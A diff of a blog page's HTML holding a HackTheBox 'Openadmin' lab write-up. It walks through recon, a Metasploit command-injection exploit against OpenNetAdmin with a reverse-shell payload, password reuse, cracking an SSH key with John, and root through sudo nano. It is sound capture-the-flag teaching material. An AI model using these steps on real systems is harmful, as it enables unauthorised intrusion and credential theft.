@@ -1,139 +1,188 @@
 <!DOCTYPE html>
 <html lang="en">
-
   <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Language" content="en">
-
-    <meta name="author" content="Ajdin Trejić">
-    <meta name="description" content="Reconnaissance Let&rsquo;s see what have we got here with nmap.
-nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: probe open ports to determine service/version info -O: OS detection -oA: output OS detection, version detection, script scanning, and traceroute Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan.">
-    <meta name="keywords" content="blog,developer,personal,write-up">
-
-    <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="HackTheBox :: Openadmin Write Up"/>
-<meta name="twitter:description" content="Reconnaissance Let&rsquo;s see what have we got here with nmap.
+    
+      <title>HackTheBox Openadmin Write Up :: Ajdin Trejić — Ajdin&#39;s blog about stuff</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Reconnaissance Let&amp;rsquo;s see what have we got here with nmap.
 nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: probe open ports to determine service/version info -O: OS detection -oA: output OS detection, version detection, script scanning, and traceroute Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan."/>
+<meta name="keywords" content="Infosec, information security, cybersecurity, security, web development, webdev"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/htb-openadmin/" />
 
-    <meta property="og:title" content="HackTheBox :: Openadmin Write Up" />
-<meta property="og:description" content="Reconnaissance Let&rsquo;s see what have we got here with nmap.
-nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: probe open ports to determine service/version info -O: OS detection -oA: output OS detection, version detection, script scanning, and traceroute Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan." />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.min.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Openadmin Write Up"/>
+<meta name="twitter:description" content="This is a write up on how to gain root on HackTheBox Openadmin"/>
+
+
+
+<meta property="og:title" content="HackTheBox Openadmin Write Up" />
+<meta property="og:description" content="This is a write up on how to gain root on HackTheBox Openadmin" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ajdintrejic.github.io/posts/htb-openadmin/" />
+<meta property="og:url" content="/posts/htb-openadmin/" />
 <meta property="article:published_time" content="2020-05-02T09:03:27+02:00" />
-<meta property="article:modified_time" content="2020-05-02T09:03:27+02:00" />
+<meta property="article:modified_time" content="2020-05-02T09:03:27+02:00" /><meta property="og:site_name" content="Ajdin Trejić" />
 
 
-    
-      <base href="https://ajdintrejic.github.io/posts/htb-openadmin/">
-    
-    <title>
-  HackTheBox :: Openadmin Write Up · ajdintrejic
-</title>
 
-    
-      <link rel="canonical" href="https://ajdintrejic.github.io/posts/htb-openadmin/">
-    
 
-    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
 
-    
-      
-      
-      <link rel="stylesheet" href="https://ajdintrejic.github.io/css/coder.min.25dead06d06a3a86c2ff00e89506994da7e12f76d83f8cd22a40b144dc7ff1bd.css" integrity="sha256-Jd6tBtBqOobC/wDolQaZTafhL3bYP4zSKkCxRNx/8b0=" crossorigin="anonymous" media="screen" />
-    
 
-    
 
-    
 
-    
-      <link rel="stylesheet" href="https://ajdintrejic.github.io/css/codeFix.css" />
-    
-
-    
-
-    <link rel="icon" type="image/png" href="https://ajdintrejic.github.io/images/favicon-32x32.png" sizes="32x32">
-    <link rel="icon" type="image/png" href="https://ajdintrejic.github.io/images/favicon-16x16.png" sizes="16x16">
-
-    <meta name="generator" content="Hugo 0.73.0" />
   </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ajdin.io</span>
+    <span class="logo__cursor"></span>
+  
+</a>
 
-  
-  
-  <body class="colorscheme-light">
-    <main class="wrapper">
-      <nav class="navigation">
-  <section class="container">
-    <a class="navigation-title" href="https://ajdintrejic.github.io/">
-      ajdintrejic
-    </a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
     
-    <input type="checkbox" id="menu-toggle" />
-    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
-    <ul class="navigation-list">
       
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdintrejic.github.io/about/">About</a>
-          </li>
+          <li><a href="/about">About</a></li>
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdintrejic.github.io/posts/">Blog</a>
-          </li>
+      
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdintrejic.github.io/projects/">Projects</a>
-          </li>
+          <li><a href="/categories/hackthebox">HTB</a></li>
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdintrejic.github.io/cv/">CV</a>
-          </li>
+      
+        
+          <li><a href="/cv">CV</a></li>
         
       
       
-    </ul>
     
-  </section>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/categories/hackthebox">HTB</a></li>
+      
+    
+      
+        <li><a href="/cv">CV</a></li>
+      
+    
+  </ul>
 </nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+<div class="padding">
+<div id="cookies-eu-banner" class="post" style="display: none;">
+    By continuing to visit this site, you accept the use of cookies for statistical purposes.
+    <a href="/privacy" id="cookies-eu-more">Read more</a>
+    
+	<div class="flex">
+    <button class="button" id="cookies-eu-accept">Accept</button>
+    </div>
+</div>
+</div>
 
 
       <div class="content">
         
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">HackTheBox :: Openadmin Write Up</h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fas fa-calendar"></i>
-              <time datetime='2020-05-02T09:03:27&#43;02:00'>
-                May 2, 2020
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fas fa-clock"></i>
-              4-minute read
-            </span>
-          </div>
-        </div>
-      </header>
+  
+  
 
-      <div>
+  <div class="post">
+    <h1 class="post-title"><a href="/posts/htb-openadmin/">HackTheBox Openadmin Write Up</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-05-02
+        </span>
+
         
-          <img src='https://ajdintrejic.github.io/htb-openadmin/info_card.png' alt="Featured image"/>
+          
+        
+      
+
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/nano/">Nano</a>&nbsp;
+        
+          #<a href="/tags/netstat/">netstat</a>&nbsp;
+        
+          #<a href="/tags/opennetadmin/">OpenNetAdmin</a>&nbsp;
+        
+      </span>
+    
+
+    
+      <figure class="post-cover">
+        
+          <img src="/htb-openadmin/cover.jpg" alt="HackTheBox Openadmin Write Up" />
         
 
-	
-	  <hr>
-	  <h6 id="toc">Table of Contents</h6>
-	  <div> <nav id="TableOfContents">
+        
+      </figure>
+    
+
+    <div class="post-content">
+      
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
   <ul>
     <li><a href="#reconnaissance">Reconnaissance</a></li>
     <li><a href="#owning-user">Owning user</a>
@@ -150,134 +199,185 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
       </ul>
     </li>
   </ul>
-</nav> </div>
-	  <hr>
-	
-
-
-        <h2 id="reconnaissance">Reconnaissance</h2>
+</nav></aside>
+      
+      <h2 id="reconnaissance">Reconnaissance</h2>
 <p>Let&rsquo;s see what have we got here with nmap.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -oA nmap/initial 10.10.10.171
-</code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-sC: run default script scan
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -oA nmap/initial 10.10.10.171
+</code></pre></div><pre><code>-sC: run default script scan
 -sV: probe open ports to determine service/version info
 -O: OS detection
 -oA: output OS detection, version detection, script scanning, and traceroute 
-</code></pre></div><p>Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -p- -oA nmap/full 10.10.10.171
-</code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-p-: scans from port 1 to 65535, same as -p1-65535
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/nmap_initial.png" alt="namp initial"></p>
+</code></pre><p>Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -p- -oA nmap/full 10.10.10.171
+</code></pre></div><pre><code>-p-: scans from port 1 to 65535, same as -p1-65535
+</code></pre><p><img src="/htb-openadmin/nmap_initial.png" alt="namp initial"></p>
 <p>Let&rsquo;s look at the http server.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/http_server.png" alt="http server"></p>
+<p><img src="/htb-openadmin/http_server.png" alt="http server"></p>
 <p>The page has the default Apache 2 page, so let&rsquo;s fire up gobuster. </p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.171 -x php,html -t <span style="color:#40a070">100</span>
-</code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-w: use a wordlist
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.171 -x php,html -t <span style="color:#ae81ff">100</span>
+</code></pre></div><pre><code>-w: use a wordlist
 -u: target url
 -x: search for extensions
 -t: number of threads to run
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/gobuster.png" alt="gobuster"></p>
+</code></pre><p><img src="/htb-openadmin/gobuster.png" alt="gobuster"></p>
 <h2 id="owning-user">Owning user</h2>
 <p>Gobuster found /music, if we take a look we can find a reference to 10.10.10.171/ona. This could also be achieved with dirbuster as it can parse html and search for other links. Gobuster doesn&rsquo;t offer this functionality but it&rsquo;s much faster. Let&rsquo;s enum /ona.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/ona.png" alt="ona"></p>
+<p><img src="/htb-openadmin/ona.png" alt="ona"></p>
 <p>Looks like some sort of a admin panel. Lets inspect further, we see it&rsquo;s running OpenNetAdmin version 18.1.1, and we can see it&rsquo;s not the latest version. We can run searchsploit for exploits for OpenNetAdmin.</p>
 <h3 id="exploiting-opennetadmin-with-command-injection-exploit">Exploiting OpenNetAdmin with command injection exploit</h3>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/searchsploit.png" alt="searchsploit"></p>
+<p><img src="/htb-openadmin/searchsploit.png" alt="searchsploit"></p>
 <p>So we have a exploit for the exact version which this server is running. We can copy <code>47772.rb</code> into Metasploit. If you&rsquo;re importing exploits into Metasploit you should run <code>reload_all</code> in msfconsole after <code>cp</code> the package.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m exploits/php/webapps/47772.rb
-</code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m exploits/php/webapps/47772.rb
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
 </code></pre></div><p>After the modules have been reloaded we can use the exploit. Make sure to configure everything.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#007020">set</span> lhost &lt;your ip, run <span style="color:#4070a0">&#34;ip addr&#34;</span> to find it&gt;
-<span style="color:#007020">set</span> rhost 10.10.10.171
-<span style="color:#007020">set</span> payload linux/x64/shell_reverse_tcp
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">set lhost &lt;your ip, run <span style="color:#e6db74">&#34;ip addr&#34;</span> to find it&gt;
+set rhost 10.10.10.171
+set payload linux/x64/shell_reverse_tcp
 </code></pre></div><p>After using this payload we get a shell as www-data. You can see who you are with <code>whoami</code>.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/www_data_shell.png" alt="www data shell"></p>
+<p><img src="/htb-openadmin/www_data_shell.png" alt="www data shell"></p>
 <h3 id="privilege-escalation-with-db-password">Privilege escalation with db password</h3>
 <p>Now we need to escalate privileges. Let&rsquo;s see who is using this machine.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/users.png" alt="users"></p>
+<p><img src="/htb-openadmin/users.png" alt="users"></p>
 <p>We have Jimmy and Joanna. Let&rsquo;s enumerate the directory we are thrown in. You have to chech every folder from here. The key to escalating privileges is finding the <code>./local/config</code> folder. We have a file with clear text password for the database.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/db_passwords.png" alt="database password"></p>
+<p><img src="/htb-openadmin/db_passwords.png" alt="database password"></p>
 <p>Now we can assume one of the users was sloppy and used the same password for their account. Let&rsquo;s to to ssh into one of them.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/jimmy_ssh.png" alt="ssh"></p>
+<p><img src="/htb-openadmin/jimmy_ssh.png" alt="ssh"></p>
 <p>So we can ssh into Jimmy but it doesn&rsquo;t contain the user.txt, so joanna is the user which we have to own. Now this is a bit tricky. We have to enumerate again. Directory <code>/var/www</code> seems like a server of some sort.</p>
 <h3 id="wierd-server-on-localhost">Wierd server on localhost</h3>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/main_php.png" alt="main php"></p>
+<p><img src="/htb-openadmin/main_php.png" alt="main php"></p>
 <p>So if we can access the server it will output us the ssh private key for joanna. Amazing, but how do we access that? Let&rsquo;s run netstat</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netstat -lt 
-</code></pre></div><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-l: listening connections
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netstat -lt 
+</code></pre></div><pre><code>-l: listening connections
 -t: TCP connections
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/n2.png" alt="netstat"></p>
+</code></pre><p><img src="/htb-openadmin/n2.png" alt="netstat"></p>
 <p>So we have an unusual port 52846 listening on localhost. We can curl from ssh as we can&rsquo;t access this from the browser. </p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl localhost:52846
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/curl_1.png" alt="curl"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl localhost:52846
+</code></pre></div><p><img src="/htb-openadmin/curl_1.png" alt="curl"></p>
 <p>We&rsquo;ve got a webpage, let&rsquo;s access that main.php file from before.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/curl_2.png" alt="curl"></p>
+<p><img src="/htb-openadmin/curl_2.png" alt="curl"></p>
 <h3 id="cracking-the-hash-with-john">Cracking the hash with John</h3>
 <p>Now we have the <code>id_rsa</code> key for joanna we have to decrypt it, so we can get the password for the private key. Copy the key on your machine and save it as <code>id_rsa</code>, and copy the <code>ssh2john</code> script so we can use john on this key.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ cp /usr/share/john/ssh2john.py .
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ cp /usr/share/john/ssh2john.py .
 </code></pre></div><p>Pipe the output to a file:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ ./ssh2john.py id_rsa &gt; hash.txt
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-openadmin/john.png" alt="john"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/openadmin$ ./ssh2john.py id_rsa &gt; hash.txt
+</code></pre></div><p><img src="/htb-openadmin/john.png" alt="john"></p>
 <p>We have the password. <code>bloodninjas</code>, now let&rsquo;s connect as Joanna.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/ssh_joanna.png" alt="ssh Joanna"></p>
+<p><img src="/htb-openadmin/ssh_joanna.png" alt="ssh Joanna"></p>
 <p>from here we can cat <code>user.txt</code> and we have got the user flag.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ cat user.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ cat user.txt
 c9b2c...
 </code></pre></div><h2 id="getting-root">Getting root</h2>
 <p>Getting root is fairly easy. Each time you log into an user, try running <code>sudo -l</code> so you can see if something can be ran as root, and exploited to gain a shell. Luckily we do have a command we can run as root.</p>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/sudo_l.png" alt="sudo l"></p>
+<p><img src="/htb-openadmin/sudo_l.png" alt="sudo l"></p>
 <p>If you encounter any command that can be ran as root you should check out GTFOBins. They can help you break out of an environment. Now run the above mentioned command as root, and get a shell as root.
 (note: you can also use the file read GTFOBin)</p>
 <h3 id="privilege-escalation-with-nano">Privilege escalation with Nano</h3>
-<p><img src="https://ajdintrejic.github.io/htb-openadmin/nano.png" alt="nano"></p>
+<p><img src="/htb-openadmin/nano.png" alt="nano"></p>
 <p>You might get confused as the first few commands will overwrite nano&rsquo;s interface but just navigate to root.txt</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whoami 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whoami 
 root
 $ cat /root/root.txt
 2f907...
 </code></pre></div><p>This is how I managed to gain root on this box. Hope you learned something through this write up.</p>
 
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/csrf-bypass-token-with-xss/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">CSRF Token Extraction</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/posts/htb-mango/">
+                  <span class="button__text">HackTheBox Mango Write Up</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
       </div>
 
-
-      <footer>
-        
-
-
-        
-        
-        
-      </footer>
-    </article>
-
+      
+        <footer class="footer">
+  <div class="footer__inner">
     
-  </section>
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ajdin.io</span>
+    <span class="logo__cursor"></span>
+  
+</a>
 
+      <div class="copyright">
+
+        <span>© 2020  <a href="https://twitter.com/ajdintrejic" target="_blank" rel="noopener">Ajdin Trejić</a></span>
+        <span><a href="/privacy" target="_blank" rel="noopener">Privacy</a></span>
       </div>
+    
+  </div>
+</footer>
 
-      
-  <footer class="footer">
-    <section class="container">
-      
-      
-        ©
+
+
+
+
+<script src="/js/menu.js"></script>
+<script src="/js/theme.js"></script>
+<script src="/js/prism.js"></script>
+
+
+<script src="/cookies-eu-banner.js"></script>
+<script>
+    console.log("hello")
+    new CookiesEuBanner(function () {
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
         
-          2019 -
-        
-        2020
-         Ajdin Trejić 
-      
-      
-      
-    </section>
-  </footer>
+        ga('create', 'UA-XXXXXXXX-X', 'auto');
+        ga('send', 'pageview');
+    });
+</script>
 
-    </main>
+
+
+
+
+      
+    </div>
 
     
-
-    
-
-    
-
   </body>
-
 </html>
